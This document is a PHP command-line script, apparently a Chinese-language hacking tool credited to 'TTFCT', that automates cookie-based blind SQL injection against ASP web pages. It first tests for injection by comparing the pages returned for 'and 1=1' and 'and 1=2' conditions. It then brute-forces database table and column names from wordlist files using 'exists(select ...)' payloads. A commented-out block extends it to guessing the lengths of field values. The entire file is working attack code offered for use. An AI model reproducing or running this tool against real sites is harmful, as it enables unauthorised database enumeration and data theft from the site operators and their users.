<?php
error_reporting(7);
ini_set("max_execution_time",0);
print_r('
--------------------------------Code By TTFCT-------------------------------
');
if($argc<>6){
print_r('
数字型：
Example:'.$argv[0].' ttfct.com /test/ttfct.asp id 10 html
');
print_r('
字符型：
Example:'.$argv[0].' ttfct.com /test/ttfct.asp name admin\' html
');
die();}
global $Mtable,$vls,$Mcol,$Seet,$Seec;
$host=$argv[1];$path=$argv[2];
$Mid=$argv[3];$Mnum=$argv[4];
$info=$argv[5];
if(vul())
{
print_r('

--------------------------------TTFCT提示你---------------------------------
存在注入

');
$vls=1;
$Mtable=guesstable();
$Seec=guestcol();
echo $Seec;
}
else{
print_r('

---------------------------------TTFCT提示你--------------------------------
不存在注入
');
$vls=0;
die();}

//发送COOKIE
function send($cookie){
global $host,$path,$message;
$message = "GET $path HTTP/1.0\n";
$message .= "Referer: 127.0.0.1\r\n";
$message .= "Host: 127.0.0.1\r\n";
$message .= "Cookie: ".$cookie."\r\n";
$message.="Accept: text/plain\r\n";
$message.="Connection: Close\r\n\r\n"; # echo $message;
$fp = fsockopen( $host, 80 );
fputs($fp,$message);
while($fp&&!feof($fp)) {
$resp .= fread($fp,1024);}
fclose($fp);
return $resp;
}

function getright(){
global $Mid,$Mnum,$host,$path,$info;
if(strpos(urlencode($Mnum),"%27"))
$Tmpcookie1=$Mid."=".urlencode($Mnum)." and%20%271%27%3D%271";
else
$Tmpcookie1=$Mid."=".urlencode($Mnum)." and%201%3D1";
$Get1=strstr(send($Tmpcookie1),$info);
return $Get1;
}


function vul(){
global $Mid,$Mnum,$host,$path,$info;
//1=1页面发送
$Get1=getright();
//1=2页面发送
if(strpos(urlencode($Mnum),"%27"))
$Tmpcookie2=$Mid."=".urlencode($Mnum)." and%20%271%27%3D%272";
else
$Tmpcookie2=$Mid."=".urlencode($Mnum)." and%201%3D2";
$Get2=strstr(send($Tmpcookie2),$info);
if($Get1==$Get2)
return false;
else
return true;
}
//猜解表名
function guesstable(){
global $Mid,$Mnum,$host,$path,$info;
$table=file("table.txt");
for($i=0;$i<count($table);$i++){
if(strpos(urlencode($Mnum),"%27"))
$sql=" and exists(select * from ".trim($table[$i]).") and ''='";
else
$sql=" and exists(select * from ".trim($table[$i]).")";
echo "\r请耐心等待........$i";
$Tcookie=$Mid."=".urlencode($Mnum).str_replace("+","%20",urlencode($sql));
$Get1=strstr(send($Tcookie),$info);
$Get2=getright();
if($Get1==$Get2){$Mtable.=$table[$i]."|";echo "\r成功获得表名..............$table[$i]\r";}}
return $Mtable;}

//猜解字段
function guestcol(){
global $Mid,$Mtable,$Mcol,$Mnum,$host,$path,$info;
$len=0;$cols=array();
$col=file("column.txt");
$tables=explode("|",$Mtable);
$count_t=count($tables);
for($j=0;$j<$count_t-1;$j++){
echo "\r\n..........................Table：$tables[$j]\r";
for($i=0;$i<count($col)-1;$i++){
if(strpos(urlencode($Mnum),"%27"))
$sql=" and exists(select ".trim($col[$i])." from ".$tables[$j].") and ''='";
else
$sql=" and exists(select ".trim($col[$i])." from ".$tables[$j].")";
echo "\r请耐心等待........[$j][$i]";
$Tcookie=$Mid."=".urlencode($Mnum).str_replace("+","%20",urlencode($sql));
$Get1=strstr(send($Tcookie),$info);
$Get2=getright();
if($Get1==$Get2){
echo "\r...........................column：$col[$i]";
}
/*$char= @array(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,
D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,1,2,3,4,5,6,7,8,9);
for($k=1;$k<=15;$k++){
$sql=" and (select len($col[$i])=$k from $tables[$j]) and ''='";
$Tcookie=$Mid."=".urlencode($Mnum).str_replace("+","%20",urlencode($sql));
$Getx=strstr(send($Tcookie),$info);
$Getxx=getright();
if($Getx==$Getxx){
$len=$k;
echo "$tables[$j].$col[$i]....length：$len";
break;
}*/}}
echo "\r\n---------------------------------猜解完毕------------------------------";
}
?>